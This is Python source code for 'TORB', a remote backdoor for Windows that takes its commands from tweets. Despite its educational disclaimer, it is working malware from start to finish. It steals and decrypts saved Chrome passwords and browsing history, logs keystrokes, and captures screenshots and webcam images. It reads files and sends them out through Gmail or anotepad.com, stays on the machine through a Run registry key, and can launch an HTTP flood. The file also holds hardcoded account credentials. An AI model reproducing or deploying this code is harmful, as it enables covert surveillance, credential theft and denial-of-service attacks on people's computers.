
# TORB - Twitter Operated Remote Backdoor (Public Version)
# Coded by (Pythogen) 2018 - https://github.com/pythogen

# Disclaimer: This was written for experimental/educational reasons and is not intended for malicious use!
# Please use only on machines you have full permission to control & monitor! Malicious commands & functionality removed.

#                              IIII       
#                   ZZ~      ?IIIIII?     
#             : I7=?+Z$$$7ZI7IIIII  ,I:   
#             ,7+?IIII$$$$IIIIIIII, III7, 
#                +?IIIIIIIIIIIIIIIIIII,   
#                   I7IIIIIIIIIIIIIIII    
#                   IIIIIIIIIII?+:,=I     
#                =?IIIIIIIIIII:::::::     
#  ,=        ,=IIIIIIIIIIIII:::::,:,      
#     ~?I??IIIIIIIIIIIIIIII:::,:::        
#        +?IIIIIIIIIIIIIII:::::::         
#           ~IIIIIIIIIIIII:::::           
#                 ~?IIIIII=               

# Version 1.0

# TORB allows you to control computers using only tweets.
# Very reliable and very simple to use:

# Client/Controller: 		https://twitter.com/pyprototype
# Output Host 1: 			Gmail Inbox
# Output Host 2 (Backup): 	https://anotepad.com/

# Instructions:

# 1) Provide link to your Twitter bot in variable 'cntrlPanel'
# 2) Provide your Gmail bot's authentication details in variable 'to'
# 3) Compile to EXE
# 4) Execute and check your inbox. You'll receive the commands
# 5) Issue commands by tweeting and take control

# Note: If Gmail feedback fails then the data is instead uploaded to anotepad.com as a note submission (Backup Host)

# Server Builder requires pyinstaller

import requests
from time import sleep
import ctypes
from ctypes import *
import pyautogui 
import sys
import os
import wx
import socket
import threading
import webbrowser
import smtplib
import operator
import pyHook, pythoncom, sys, logging
from shutil import copyfile
import shutil
import subprocess
import win32com.client
from win32com.shell import shell, shellcon
from collections import OrderedDict
import matplotlib.pyplot as plt
import sqlite3
import win32crypt
import requests
from random import randint
import random
import time
import string
import cv2
import platform
import wmi
import signal

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv

# Edit These details
##############################################
# Twitter - Control Panel
cntrlPanel = 'http://twitter.com/pyprototype'
# Gmail - Bot authentication details (Server)
gmail_user = 'pyhannahmaple@gmail.com'
gmail_password = 'sweetiepie54'
# Gmail - Receiving Address (Client)
to = ['elliotarigato@gmail.com']
# anotepad.com - backup output bot authentication details
anotepadUser = 'pyhannahmaple@gmail.com'
anotepadPass = 'xgtfVBZV5Ed9eLFd'
##############################################

print "\nTORB - Twitter Operated Remote Backdoor (Public Edition)\n"

print """
 _|_|_|_|_|    _|_|    _|_|_|    _|_|_|          _|        _|    
     _|      _|    _|  _|    _|  _|    _|      _|_|      _|  _|  
     _|      _|    _|  _|_|_|    _|_|_|          _|      _|  _|  
     _|      _|    _|  _|    _|  _|    _|        _|      _|  _|  
     _|        _|_|    _|    _|  _|_|_|          _|  _|    _|    
"""

# Log List [Keylog]
grab = []

# Access DLLs [Keylog]
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None

# From previous code
shell = win32com.client.Dispatch("WScript.Shell")
extr = []
chrpw = []
chrpwStr = ""
keyCheck = 0
keyCount = 0

# VarCrypted
pfA="s"
zPz="6"
grP="i"
Qkg="p"
ppR="t"
aEr="2"
pgW="e"
tgT="w"
mmX="4"

# ArrCrypted
ClayBin = ['g','x','c','g','4','3','q','*','y','m','0','p','!','t','h','z','a','b','b','8','@','n','f','n','s','t','s','2','a','$','h','e','o','m','a','7','9','k','i','.','p','#','l']

# q Variable for control flow [TORB Core]
q = "on"

# Backup Communicator Checkpoint Variable (Initial Declaration)
bckChck = 0

def main():
	# GlobaLize q
	global q
	global chrpw
	global chrpwStr
	global hooks_manager
	global bckChck

	r = requests.get(cntrlPanel)
	x = r.content
	z = find_between(x,'data-aria-label-part="0">','</p>')

	# If SMTP doesn't fail...
	##################
	# Gmail Feedback #
	##################

	if bckChck == 0:

		# If q equals z then do nothing
		# This means the command hasn't changed since you issued one
		if q == z:
			pass

		# If q doesn't equal z then execute next command
		# This means TORB has detected that you issued another command
		elif q != z:
			# Display custom messagebox
			if "msg" in z: 
				b = z[4:]
				print "Alert sent!"
				ctypes.windll.user32.MessageBoxA(0, b, "TORB", 0)
				q = z
			# Extract Passwords from Google Chrome
			elif z == "pw":
				print "Extracting Chrome Passwords..."
				try:
					EPE_Main()
					chrme()
					relayMe(chrpwStr)
				except:
					print "Password Extraction Failed."
					relayMe("TORB was unable to extract passwords. Possible UAC restriction.")
				q = z
			# Extract Chrome Browser History
			elif z == "history":
				print "Extracting Chrome History..."
				try:
					EPE_Main()
					chromeFug()
					analyze(sites_count_sorted)
				except:
					print "History Extraction Failed."
					relayMe("TORB was unable to extract history. Possible UAC restriction.")
				q = z
			elif z == "screengrab":
				print "Capturing Screen"
				screenGrab()
				q = z
			# Produce Sound
			elif z == "beep":
				print "Beep sound played."
				beep = lambda x: os.system("echo -n '\a';sleep 0.2;" * x)
				beep(1)
				q = z
			elif z == "opencd":
				print "CD tray opened."
				ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
				q = z
			# Launch Browser / Go to specific URL
			elif "teleport" in z:
				c = find_between(z,'_blank" title="','" ><span class="')
				print "Navigating to URL"
				print c
				webbrowser.open(c)
				q = z
			elif z == "keylog":
				print "Keylogger Activated."
				# Activation Email - Inbox Notification (Relay PC details)
				deliverMe("formLoad")
				# Hook keyboard 
				hooks_manager = pyHook.HookManager()
				hooks_manager.KeyDown = OnKeyboardEvent
				hooks_manager.HookKeyboard()
				pythoncom.PumpMessages()
				q = z
			elif "scanroot" in z:
				# Scan all folders starting from base drive (example: C:\)
				b = z[9:]
				print "Scanning File Structure from Root."
				fileCycle(b)
				q = z
			elif "scandir" in z: 
				# View Fully Scanned File Structure and Explore changes to Specific Directories
				b = z[8:]
				print "Activating Scan..."
				ScanDir(b)
				q = z
			elif "download" in z:
				b = z[9:]
				Downloader(b)
				q = z
			elif "read" in z:
				b = z[5:]
				try:
					print "Reading file: %s" % (b)
					faa = open(b,'r')
					readDir = faa.read()
					relayMe(readDir)
				except:
					print "Read error."
					relayMe("Read File Error for (%s)\n\nThe provided file directory seems to be invalid. Check the command for typos and try again." % (b))
				q = z
			elif "stress" in z:
				cddu = find_between(z,'_blank" title="','" ><span class="')
				try:
					torbDoS(cddu)
				except:
					print "Error launching DoS"
					relayMe("TORB is unable to launch DoS on this host. Check for typos and try again.")
				q = z
			elif z == "pullprocess":
				print "Pulling Active Processes..."
				try:
					procGet()
				except:
					print "Error pulling processes..."
					relayMe("TORB Error\n\nTORB was unable to pull processes from this machine...")	
				q = z
			elif "killprocess" in z:
				print "Terminating Process..."
				b = z[12:]
				try:
					procTerminate(b)
				except:
					print "TORB was unable to terminate selected process..."
					relayMe("TORB Error\n\nTORB was unable to terminate selected process... Possible UAC restriction.")
				q = z
			elif z == "startup":
				print "Embedding to startup..."
				storeStart()
				q = z
			# Activate web camera and save screenshot
			elif z == "webcamview":
				try:
					print "Capturing web cam screenshot..."
					webcam_Capture()
				except:
					print "Webcam not found"
					relayMe("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
				q = z
			# Set a new desktop wallpaper
			elif "wallpaper" in z:
				print "Setting wallpaper..."
				b = z[10:]
				try:
					relayMe("TORB Notification\n\nSetting Desktop wallpaper to %s..." % (b))
					setWallpaper(b)
				except:
					print "TORB Error\n\nTORB was unable to set wallpaper..."
					relayMe("TORB Error\n\nTORB was unable to set wallpaper... Possible UAC restriction.")
				q = z
			# Put server to rest / Stop all commands
			elif z == "sleep":
				print "Entering sleep state..."
				q = z
			else:
				pass

	# Reserved Backup Communication Module
	#####################
	# anotepad Feedback #
	#####################

	elif bckChck == 1:

		if q == z:
			pass

		elif q != z:
			# Display custom messagebox
			if "msg" in z: 
				b = z[4:]
				print "Alert sent!"
				ctypes.windll.user32.MessageBoxA(0, b, "TORB", 0)
				q = z
			# Extract Passwords from Google Chrome
			elif z == "pw":
				print "Extracting Chrome Passwords..."
				try:
					EPE_Main()
					chrme()
					comm_backup(chrpwStr)
				except:
					print "Password Extraction Failed."
					comm_backup("TORB was unable to extract passwords. Possible UAC restriction.")
				q = z
			elif z == "history":
				print "Extracting Chrome History"
				try:
					EPE_Main()
					chromeFug()
					analyze(sites_count_sorted)
				except:
					print "History Extraction Failed."
					comm_backup("TORB was unable to extract history. Possible UAC restriction.")
				q = z
			elif z == "screengrab":
				print "Capturing Screen"
				print "Screen Capture Not Available in Backup Mode"
				comm_backup("TORB Error\n\nScreen Capture Not Available in Backup Mode")
				#screenGrab()
				q = z
			# Produce Sound
			elif z == "beep":
				print "Beep sound played."
				beep = lambda x: os.system("echo -n '\a';sleep 0.2;" * x)
				beep(1)
				q = z
			elif z == "opencd":
				print "CD tray opened."
				ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
				q = z
			# Launch Browser / Go to specific URL
			elif "teleport" in z:
				c = find_between(z,'_blank" title="','" ><span class="')
				print "Navigating to URL"
				print c
				webbrowser.open(c)
				q = z
			elif z == "keylog":
				print "Keylogger Activated."
				# Activation Email - Inbox Notification (Relay PC details)
				#deliverMe("formLoad")
				# Hook keyboard 
				hooks_manager = pyHook.HookManager()
				hooks_manager.KeyDown = OnKeyboardEvent
				hooks_manager.HookKeyboard()
				pythoncom.PumpMessages()
				q = z
			elif "scanroot" in z:
				# Scan all folders starting from base drive (example: C:\)
				b = z[9:]
				print "Scanning File Structure from Root."
				fileCycle(b)
				q = z
			elif "scandir" in z: 
				# View Fully Scanned File Structure and Explore changes to Specific Directories
				b = z[8:]
				print "Activating Scan..."
				ScanDir(b)
				q = z
			elif "download" in z:
				b = z[9:]
				print "Downloader Not Available in Backup Mode"
				comm_backup("TORB Error\n\nDownloader Not Available in Backup Mode")
				#Downloader(b)
				q = z
			elif "read" in z:
				b = z[5:]
				try:
					print "Reading file: %s" % (b)
					faa = open(b,'r')
					readDir = faa.read()
					comm_backup(readDir)
				except:
					print "Read error."
					comm_backup("Read File Error for (%s)\n\nThe provided file directory seems to be invalid. Check the command for typos and try again." % (b))
				q = z
			elif "stress" in z:
				cddu = find_between(z,'_blank" title="','" ><span class="')
				try:
					torbDoS(cddu)
				except:
					print "Error launching DoS"
					relayMe("TORB is unable to launch DoS on this host. Check for typos and try again.")
				q = z
			elif z == "pullprocess":
				print "Pulling Active Processes..."
				try:
					procGet()
				except:
					print "Error pulling processes..."
					comm_backup("TORB Error\n\nTORB was unable to pull processes from this machine...")	
				q = z
			elif "killprocess" in z:
				print "Terminating Process..."
				b = z[12:]
				try:
					procTerminate(b)
				except:
					print "TORB was unable to terminate selected process..."
					comm_backup("TORB Error\n\nTORB was unable to terminate selected process... Possible UAC restriction.")
				q = z
			elif z == "startup":
				print "Embedding to startup..."
				storeStart()
				q = z
			# Activate web camera and save screenshot
			elif z == "webcamview":
				try:
					print "Web Cam Screenshot Feature Not Available in Backup Mode"
					comm_backup("TORB Error\n\nWeb Cam Screenshot Feature Not Available in Backup Mode")
				except:
					print "Webcam not found"
					comm_backup("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
				q = z
			# Set a new desktop wallpaper
			elif "wallpaper" in z:
				print "Setting wallpaper..."
				b = z[10:]
				try:
					comm_backup("TORB Notification\n\nSetting Desktop wallpaper to %s..." % (b))
					setWallpaper(b)
				except:
					print "TORB Error\n\nTORB was unable to set wallpaper..."
					comm_backup("TORB Error\n\nTORB was unable to set wallpaper... Possible UAC restriction.")
				q = z
			# Put server to rest / Stop all commands
			elif z == "sleep":
				print "Entering sleep state..."
				q = z
			else:
				pass

		sleep(2)

def parse(url):
	try:
		parsed_url_components = url.split('//')
		sublevel_split = parsed_url_components[1].split('/', 1)
		domain = sublevel_split[0].replace("www.", "")
		return domain
	except IndexError:
		print "Index[e]"

# Grab Full History
def analyze(results):
	global arrHist
	arrHist = []

	for site, count in sites_count_sorted.items():
		arrHist.append(site)
	historyExtracted(arrHist)

# Pass history results for output
def historyExtracted(histList):
	print "\n\n-----------------------"
	print "History Search Results:"
	print "-----------------------\n"
	fugVar = ""
	for i in histList:
		fugVar = fugVar + str(i) + "\n"
	print "\nExtraction Complete!\n"
	print fugVar
	if bckChck == 0:
		relayMe(fugVar)
	elif bckChck == 1:
		comm_backup(fugVar)

def chromeFug():
	# Chrome's path
	global sites_count_sorted
	data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
	files = os.listdir(data_path)

	history_db = os.path.join(data_path, 'history')

	# Using SQL to query Chrome's DB
	c = sqlite3.connect(history_db)
	cursor = c.cursor()
	select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
	cursor.execute(select_statement)

	results = cursor.fetchall() #tuple

	# Dictionary for iterations
	sites_count = {}

	for url, count in results:
		url = parse(url)
		if url in sites_count:
			sites_count[url] += 1
		else:
			sites_count[url] = 1

	sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))

def comm_backup(subjNote):

	global login_URL
	global page
	global landing
	global keyword

	comm_append = ''

	for comm_i in subjNote:
		comm_append = comm_append + comm_i

	login_URL = 'https://anotepad.com/create_account'
	landing = 'https://anotepad.com/'
	keyword = 'Logout'

	note_title = random.randint(10000,99999)
	note_description = comm_append
	creationLink = 'https://anotepad.com/note/create'

	print subjNote

	with requests.Session() as c:
	
		login_data = \
		{
			'action': 'login',
			'email': anotepadUser,
			'password': anotepadPass,
			'submit':'' 
		}

		create_form = \
		{
			'notetype': 'PlainText',
			'noteaccess': '1',
			'notepassword':'',
			'notequickedit': 'false',
			'notequickeditpassword':'', 
			'notetitle': note_title,
			'notecontent': note_description
		}

		header_data = \
		{
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Cache-Control': 'max-age=0',
			'Connection': 'keep-alive',
			'Content-Length': '73',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; _gat=1; __atuvc=7%7C11; __atuvs=5aa6da6b2e4908e9006',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/create_account',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36'
		}

		header_create = \
		{
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Connection': 'keep-alive',
			'Content-Length': '172',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; Anotepad=645503E71D3DEB85AF8F469D7A8227A738E907F75816F05B37A18CFF114F39E92911FCFD29D898D34D4AD800E30F703B4E7460AF5FF83767A4D6F63DE0DE2D59444CB25286F7CE7534815FA04973D2F3C81749DB58EFEDE0BC7A1FD2D3FF6E1FE81665BF6CE882BDA6B10B929BF6F044; _gat=1; __atuvc=41%7C11; __atuvs=5aa6da6b2e4908e9028',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36',
			'X-Requested-With': 'XMLHttpRequest'
		}

		c.get(login_URL)
		c.post(login_URL, data=login_data, headers=header_data)

		comm_backup.page = c.get(landing)
		Check = comm_backup.page.content.find(keyword)
		ry = comm_backup.page.content

		if Check == -1:
			print '\nlogin failed. (Try again)'
		else:
			print '\nSuccessful login + submission'

		c.post(creationLink, data=create_form, headers=header_create)

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def Downloader(DLFile):
	print "Downloading file: %s..." % (DLFile)
	try:
		DatDLoader(DLFile)
	except:
		print "\nError retrieving file.\n"
		relayMe("TORB was unable to retrieve the specified file. Check the directory and try again.")

def screenGrab():
	global usrHandle
	global envoDr

	try:
		usrHandle = os.environ['USERNAME']
		envoDr = 'C:\Users\%s\Downloads\screenshot.png' % (usrHandle)
		app = wx.App()
		screen = wx.ScreenDC()
		size = screen.GetSize()
		bmp = wx.Bitmap(size[0], size[1])
		mem = wx.MemoryDC(bmp)
		mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
		del mem
		bmp.SaveFile(envoDr, wx.BITMAP_TYPE_PNG)
		DatDLoader(envoDr)
	except:
		print "Error capturing screen"
		relayMe("Screen capture error\n\nTORB failed to capture screenshot. Possible UAC restriction.")

def DatDLoader(takeMe):
	global gmail_user
	global to
	global gmail_password
	global usrHandle
	global envoDr

	fileNameVar = random.randint(10000,99999)

	subject = 'TORB File Download'

	msg = MIMEMultipart()
	msg['From'] = gmail_user
	msg['To'] = to[0]
	msg['Subject'] = subject

	body = 'TORB has delivered your file:'
	msg.attach(MIMEText(body,'plain'))

	filename ='%s' % (fileNameVar)
	attachment = open(takeMe,'rb')

	part = MIMEBase('application','octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition',"attachment; filename= "+filename)

	msg.attach(part)
	text = msg.as_string()
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(gmail_user,gmail_password)


	server.sendmail(gmail_user,to,text)
	server.quit()

def storeStart():
	SERVICE_NAME= "torb"

	if getattr(sys, 'frozen', False):
	    EXECUTABLE_PATH = sys.executable
	elif __file__:
	    EXECUTABLE_PATH = __file__
	else:
	    EXECUTABLE_PATH = ''
	EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)

	try:
	    stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "%USERPROFILE%\\" + EXECUTABLE_NAME))
	    shutil.copyfile(EXECUTABLE_PATH, os.path.expanduser("~/%s" % EXECUTABLE_NAME))
	except IOError:
		print "Permission Denied Caught"

def fileCycle(argExt):
    global extr
    global t
    global bckChck

    folder = "C:\\"
    collectionInb = ''

    # traverse root directory, and list directories as dirs and files as files
    #for root, dirs, files in os.walk("."):
    #    path = root.split(os.sep)
    #    print((len(path) - 1) * '---', os.path.basename(root))
    #    for file in files:
    #        print(len(path) * '---', file)

    print "\nExtracting Files...\n"
    for (paths, dirs, files) in os.walk(folder):
            for file in files:
                if file.endswith(argExt):
                    print os.path.join(paths, file)
                    extr.append(os.path.join(paths, file))
    print "\nExtraction Complete!\n"
    for extScan in extr:
    	collectionInb = collectionInb + extScan + "\n"

    if bckChck == 0:
	    relayMe(collectionInb)
    elif bckChck == 1:
		comm_backup(collectionInb)

def scrambleKeys():
	if keyCount < 50 and keyCheck == 0:
		gen = random.choice(string.letters)
		if inp=="a":
			shell.SendKeys("{BACKSPACE}")
			shell.SendKeys(gen)
		elif inp=="e":
			shell.SendKeys("{BACKSPACE}")
			shell.SendKeys(gen)
		elif inp=="i":
			shell.SendKeys("{BACKSPACE}")
			shell.SendKeys(gen)
		elif inp=="o":
			shell.SendKeys("{BACKSPACE}")
			shell.SendKeys(gen)
		elif inp=="u":
			shell.SendKeys("{BACKSPACE}")
			shell.SendKeys(gen)
	else:
		keyCheck = 1

def ScanDir(selDir):
	global to
	global bckChck

	try:
		print "\nScanning Directory: %s..." % (selDir)
		prepDir = "\nScanned Directory (%s):\n" % (selDir)
		dirCollect = os.listdir(selDir)
		for dirScan in dirCollect:
			print dirScan
			prepDir = prepDir + "\n%s" % (dirScan)
		if bckChck == 0:
			relayMe(prepDir)
		elif bckChck == 1:
			comm_backup(prepDir)
	except:
		print "Directory Scan Error for (%s)" % (selDir)
		if bckChck == 0:
			relayMe("Directory Scan Error for (%s)\n\nThe provided directory seems to be invalid. Check the command for typos and try again." % (selDir))
		elif bckChck == 1:
			comm_backup("Directory Scan Error for (%s)\n\nThe provided directory seems to be invalid. Check the command for typos and try again." % (selDir))

# Universal Subroutine for Gmail information delivery
def relayMe(pushMe):
	global cmdList
	global bckChck

	sent_from = gmail_user  

	subject = 'TORB - Pythogen'  
	body = "\n%s" % (pushMe)

	email_text = """\  
	From: %s  
	To: %s  
	Subject: %s

	%s
	""" % (sent_from, ", ".join(to), subject, body)

	try:  
	    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	    server.ehlo()
	    server.login(gmail_user, gmail_password)
	    server.sendmail(sent_from, to, email_text)
	    server.close()
	    print 'Email sent to %s.\n' % (to[0])
	except:  
	    print 'Accessing Backup Communication Module (anotepad.com)'
	    # Back up communicator routine
	    bckChck = 1
	    comm_backup("Backup Communication Module Accessed - Host Connection Established\n%s" % (cmdList))
	    
	return True

def deliverMe(feedMe):
	global gmail_user
	global gmail_password
	global to
	global bckChck

	# Variable for list conversion
	a = ''

	# Cycle feedMe list and..
	for i in feedMe:
		# Append as string within variable 'a'
		a = a + i

	# Terminal Activity Condition
	if feedMe=="formLoad":
		# Activation terminal notification
		print "\nTORB Activated!\n"
	else:
		# Collected Keys to be sent to inbox.
		print "\nRecorded Keystrokes: %s\n" % (a)

	sent_from = gmail_user  

	subject = 'TORB - Pythogen'  

	# Email Body Condition (Activation OR Keylogs)
	if feedMe == "formLoad":
		body = "\nKeylogger Activated!\n\nMachine: %s\n\nListening for Activity..." % os.environ['COMPUTERNAME']
	else:
		# Give body keystrokes. View from inbox
		body = a

	email_text = """\  
	From: %s  
	To: %s  
	Subject: %s

	%s
	""" % (sent_from, ", ".join(to), subject, body)

	try:  
	    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	    server.ehlo()
	    server.login(gmail_user, gmail_password)
	    server.sendmail(sent_from, to, email_text)
	    server.close()
	    print 'Email sent to %s.\n' % (gmail_user)
	except:  
	    print 'oops! Check code...'
	    
	return True

def chrme():
    global chrpw
    global chrpwStr

    data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"

    login_db = os.path.join(data_path, 'Login Data')

    c = sqlite3.connect(login_db)
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value, password_value FROM logins"
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    credential = {}

    for url, user_name, pwd, in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) 
        credential[url] = (user_name, pwd[1])

    for url, credentials in credential.iteritems():
        if credentials[1]:
        	chrpw.append("%s - %s : %s" % (url, credentials[0].encode('utf-8'), credentials[1]))
        	chrpwStr = chrpwStr + "%s\n" % ("%s - %s : %s" % (url, credentials[0].encode('utf-8'), credentials[1]))

def EPE_Main():
	# Kill Chrome process for password extraction
	os.system('taskkill /F /IM chrome.exe')

def OnKeyboardEvent(event):
    # globalize for Window Title Condition
    global winTitle
    global hooks_manager
    global bckChck

    # If window title is different, then call title function
    if event.WindowName != winTitle:
    	winTitle = event.WindowName
    	getWindowTitle()

    # Keylog related code...
    logging.basicConfig(level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii) + " - %s" % len(grab))
    grab.append( chr(event.Ascii))

    # This condition checks how many keystrokes detected
    # When X amount of keystrokes detected, send key list to email function
    if len(grab) >= 200:
    	print '\ndelivering keys via GMAIL'

		# Call delivery function with keystroke list
    	if bckChck == 0:
    		deliverMe(grab)
    	elif bckChck == 1:
    		comm_backup(grab)

    	# Clear list for more logging
    	del grab[:]

    	#hooks_manager.UnhookKeyboard()
    else:
    	pass

    return True
    
# Detect Window Title
def getWindowTitle():
	# Get window in focus
	hwnd = user32.GetForegroundWindow()

	# Extract the window's title
	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)
	
	# Display title in console
	print "\n\n[ %s ]\n\n" % ( title.value)
	grab.append("\n\n[ " + title.value + " ]\n\n")
	
	# Close
	kernel32.CloseHandle(hwnd)
	return True

# --- DoS Procedure ---
def auto_send_request(server_dd, number_of_requests=10):
    global inc
    requestsCheck = (requestsDD - 1)
    for z in range(number_of_requests):
        try:
            urlopen(server_dd)
            inc = inc + 1
            if inc % 100 == 0:
                print "Requests: %s." % (inc)
            if inc % 1000 == 0:
				print "\n%s blasted with %s requests!" % (server_dd,inc)
				#r = requests.get(cntrlPanel)
				#x = r.content
				#z = find_between(x,'data-aria-label-part="0">','</p>')
				#if z == "ddhalt":
				#	print "Stopper detected"
				#	break
				if bckChck == 0:
					relayMe("TORB DoS\n\nBot: %s\n\n%s blasted with %s requests!" % (os.environ['COMPUTERNAME'],server_dd,inc))
				elif bckChck == 1:
					comm_backup("TORB DoS\n\nBot: %s\n\n%s blasted with %s requests!" % (os.environ['COMPUTERNAME'],server_dd,inc))
        except IOError:
            print "Error - Bad host!\n" 
        if inc >= requestsCheck:
            print "Finished Stress Procedure"

def flood(url, number_of_requests = 1000, number_of_threads = 50):  
    number_of_requests_per_thread = int(number_of_requests/number_of_threads)
    try:
        for x in range(number_of_threads):
            Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()
    except:
        print("\n[E]\n")
    print "\nDone %i requests on %s" % (number_of_requests, url)

def stressErr():
	print "Target error. Check link and try again"

def run(url4dd, num_req):    
    global requestsDD
    global inc
    inc = 0
    print "DoS Started."
    server_dds = url4dd
    requestsDD = int(num_req)
    flood(server_dds, requestsDD)

def torbDoS(ddsHost):
    xdd = ddsHost
    ydd = 10000000
    print "%s : %s" % (xdd,ydd)
    run(xdd,ydd)

# Webcam Screenshot Capture
# Snap a photo of the person using the PC
def webcam_Capture():
	global usrHandle
	global envoDr

	cap = cv2.VideoCapture(0)

	ret, frame = cap.read()
	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)

	cv2.imshow('frame', rgb)
	
	if(platform.system()=="Linux"):
		print "Linux OS Detected!"

		# Save web cam screenshot...
		homedir = os.environ['HOME']
		envoDr = '%s/wc_ss.png' % (homedir)
		out = cv2.imwrite(envoDr, frame)

		print "Web cam screenshot saved!"

		cap.release()
		cv2.destroyAllWindows()
		# Deliver web cam screenshot...
		Downloader(envoDr)
		print "Web cam screenshot delivered!"
	elif(platform.system()=="Windows"):
		print "Windows OS Detected!"

		# Save web cam screenshot...
		usrHandle = os.environ['USERNAME']
		envoDr = 'C:\Users\%s\Downloads\wc_ss.png' % (usrHandle)
		out = cv2.imwrite(envoDr, frame)

		print "Web cam screenshot saved!"

		cap.release()
		cv2.destroyAllWindows()
		# Deliver web cam screenshot...
		Downloader(envoDr)
		print "Web cam screenshot delivered!"
	# Mac condition unfinished...
	elif(platform.system()=="Darwin"):
		print "Mac OS detected!"
		print "Unfinished section..."

# Grab Current Running Processes with associated IDs
def procGet():
	processesGathered = []
	proccesesStr = ""

	c = wmi.WMI ()

	for process in c.Win32_Process ():
	  processesGathered.append("%s - [%s]" % (process.Name,process.ProcessId))

	for pgathered in processesGathered:
		proccesesStr = proccesesStr + pgathered + "\n"

	print proccesesStr

	if bckChck == 0:
		relayMe(proccesesStr)
	elif bckChck == 1:
		comm_backup(proccesesStr)

# Terminate specific process by ID
def procTerminate(selID):
	os.kill(int(selID), signal.SIGTERM)
	print "Process #%s Terminated!" % (selID)
	if bckChck == 0:
		relayMe("TORB Notification\n\nProcess #%s Terminated" % (selID))
	elif bckChck == 1:
		comm_backup("TORB Notification\n\nProcess #%s Terminated" % (selID))

# Set new desktop wallpaper by specifying image directory
def setWallpaper(wallSet):
	SPI_SETDESKWALLPAPER = 20 
	ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wallSet , 0)
	if bckChck == 0:
		relayMe("TORB Notification\n\nWallpaper set to %s successfully." % (wallSet))
	elif bckChck == 1:
		comm_backup("TORB Notification\n\nWallpaper set to %s successfully." % (wallSet))

cmdList = """
[Fun]:
	msg [message] - Display Windows Message
	beep - Play Windows Alert Sound
	opencd - Open CD Drive
	teleport [http://example.com/] - Navigate to URL
	wallpaper [image dir] - Set Desktop Wallpaper

[Spy]:
	keylog - Monitor Keystrokes
	screengrab - Capture Screenshot
	pw - Retrieve Google Chrome Passwords
	history - Retrieve Google Chrome Browsing History
	scanroot [extension] - Scan for Files
	scandir [dir] - Scan Directory
	read [dir] - Read File Content
	download [dir] - Download File
	pullprocess - View Active/Running Processes
	webcamview - Take Web Cam Screenshot
	startup - Embed to Startup

[Destructive]:
	stress [host] - HTTP Denial of Service
	killprocess [pID] - Terminate Active Process with ID
	scramblekeys - Scramble Key Output (Feature Removed)
	exev - Executable Corruption (Feature Removed)
	morphine - JPEG Injection Memory Exhaustion (Feature Removed)
	
[Controller]:
	1) %s
	2) https://anotepad.com/ [Backup]
""" % (cntrlPanel)
relayMe("Connection Established Successfully!\n\nMachine: %s\n\nCommands:\n%s" % (os.environ['COMPUTERNAME'],cmdList))
while(True):
	main()

